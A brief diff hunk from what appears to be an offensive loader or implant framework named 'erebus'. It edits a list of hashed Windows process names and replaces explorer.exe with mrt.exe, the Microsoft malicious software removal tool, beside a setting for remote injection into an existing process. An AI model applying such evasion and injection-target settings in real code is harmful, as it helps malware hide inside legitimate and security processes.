@@ -93,7 +93,7 @@
             erebus::HashStringFowlerNollVoVariant1a("werfault.exe"), \
             erebus::HashStringFowlerNollVoVariant1a("devenv.exe"), \
             erebus::HashStringFowlerNollVoVariant1a("cloudflared.exe"), \
-            erebus::HashStringFowlerNollVoVariant1a("explorer.exe")
+            erebus::HashStringFowlerNollVoVariant1a("mrt.exe")
 #define CONFIG_INJECTION_MODE 3  // Remote injection (Inject into existing process)
 #endif
 
